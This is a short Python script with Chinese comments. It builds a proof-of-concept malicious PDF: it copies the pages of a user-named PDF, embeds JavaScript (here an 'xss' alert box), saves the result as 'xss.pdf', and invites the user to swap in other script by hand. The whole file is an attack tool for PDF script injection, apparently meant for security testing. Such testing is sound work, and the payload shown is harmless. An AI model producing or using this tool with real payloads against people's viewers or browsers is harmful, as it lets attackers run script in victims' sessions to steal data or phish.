from PyPDF2 import PdfReader, PdfWriter

# 提示用户输入原始 PDF 文件的名称
input_pdf_filename = input("请在当前目录下手动创建一个pdf，并输入pdf文件的名称（包括扩展名）：")

# 打开原始 PDF 文件
try:
    input_pdf = PdfReader(input_pdf_filename)
except FileNotFoundError:
    print(f"文件 '{input_pdf_filename}' 未找到，请检查文件名或路径。")
    exit()

# 创建一个新的 PDF 文档
output_pdf = PdfWriter()

# 将现有的 PDF 页面复制到新文档
for i in range(len(input_pdf.pages)):
    output_pdf.add_page(input_pdf.pages[i])

# 添加 JavaScript 代码，如果需要请手动修改
output_pdf.add_js("app.alert('xss');")

# 将新 PDF 文档写入到文件中
output_filename = "xss.pdf"
with open(output_filename, "wb") as f:
    output_pdf.write(f)

print(f"新的 PDF 文件已保存为 '{output_filename}'，xsspdf文件已制作完成。")
